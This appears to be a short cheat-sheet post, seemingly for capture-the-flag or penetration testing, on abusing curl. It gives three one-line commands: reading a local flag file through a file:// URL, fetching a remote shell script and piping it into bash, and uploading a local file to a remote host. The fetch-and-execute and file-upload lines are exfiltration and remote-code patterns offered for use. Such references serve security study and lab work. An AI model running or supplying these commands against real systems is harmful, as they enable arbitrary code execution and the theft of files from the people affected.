---
layout: post
title: "curl"
keywords: "curl, lfi"
---
#### Read local file
curl does not support accessing file:// URL remotely

```
curl file:///flag.txt
```

#### Fetch and execute
```
curl http://127.0.0.1/script.sh | bash
```

#### Reverse upload file
This transfers the specified local file to the remote URL.

```
curl -T /flag.txt 127.0.0.1
```